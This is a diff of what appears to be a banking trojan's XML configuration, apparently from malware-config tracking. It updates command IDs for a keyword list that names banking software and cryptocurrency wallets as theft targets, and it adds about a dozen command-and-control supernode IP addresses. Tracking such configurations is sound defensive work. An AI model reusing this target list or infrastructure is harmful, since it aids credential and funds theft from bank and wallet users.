@@ -42,13 +42,13 @@
     </module>
   </modules>
   <commands>
-    <cmd id="742297" type="15">
+    <cmd id="762358" type="15">
       <fs>crealogix,multiversa,abacus,ebics,agro-office,cashcomm,softcrew,coconet,macrogram,mammut,omikron,multicash,quatersoft,alphasys,wineur,epsitec,myaccessweb,bellin,financesuite,moneta,softcash,trinity,financesuite,abrantix,starmoney,sfirm,migrosbank,migros bank,online banking,star money,multibit,bitgo,bither,blockchain,copay,msigna,armory,electrum,coinbase,magnr,keepkey,coinsbank,coolwallet,bitoex,xapo,changetip,coinapult,blocktrail,breadwallet,luxstack,airbitz,schildbach,ledger nano,mycelium,trezor,coinomi,bitcore</fs>
     </cmd>
-    <cmd id="742299" type="22">
+    <cmd id="762360" type="22">
       <fs/>
     </cmd>
-    <cmd id="1122522" type="19">
+    <cmd id="842696" type="19">
       <fs/>
     </cmd>
   </commands>
@@ -516,11 +516,43 @@ qweqweqwe.send();
   </c2>
   <supernodes>
     <node>
+      <ip>195.123.214.147</ip>
+      <port>443</port>
+    </node>
+    <node>
       <ip>185.236.77.228</ip>
       <port>443</port>
     </node>
     <node>
-      <ip>195.123.214.147</ip>
+      <ip>69.14.75.158</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>212.159.160.208</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>51.52.205.221</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>23.251.18.85</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>67.10.59.91</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>82.26.59.237</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>137.99.236.149</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>91.84.15.17</ip>
       <port>443</port>
     </node>
     <node>
@@ -564,7 +596,11 @@ qweqweqwe.send();
       <port>443</port>
     </node>
     <node>
-      <ip>91.84.15.17</ip>
+      <ip>89.242.6.199</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>100.1.200.10</ip>
       <port>443</port>
     </node>
   </supernodes>
